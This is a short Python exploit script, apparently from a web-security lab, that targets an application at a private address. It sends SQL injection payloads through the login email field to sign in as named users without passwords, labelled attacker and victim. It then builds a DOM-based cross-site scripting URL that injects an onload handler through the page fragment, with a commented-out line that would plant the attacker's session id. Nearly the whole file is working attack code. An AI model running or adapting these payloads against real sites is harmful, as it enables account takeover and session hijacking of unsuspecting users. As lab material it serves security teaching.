import requests

url = "http://10.0.23.22/myspray/"

# Suppose Hanni Ball is the attacker.
s_attacker = requests.Session()
r_attacker = s_attacker.post(url, data={"email":"a' UNION SELECT * FROM community_member WHERE first_name='Hanni' AND last_name='Ball'; #", "password":"a"})

# Suppose N. O'Brian is the victim.
s_victim = requests.Session()
r_victim = s_victim.post(url, data={"email":"a' UNION SELECT * FROM community_member WHERE first_name='N.' AND last_name='O''Brian'; #", "password":"a"})

# On this attack we use a simpler script. The first quote closes the image element's value field, then we add the onload parameter to make the script run
# upon image loading.
js_script = "'onload='alert()"

# Set the attacker's sessionid to send the message to him.
#js_script = open("script.js", "r").read().replace("sessionid", s_attacker.cookies["sessionid"]).

# Update the url to inject code when JS evaluates document.location.href
malicious_url = url + "start.html#" + js_script

print(malicious_url)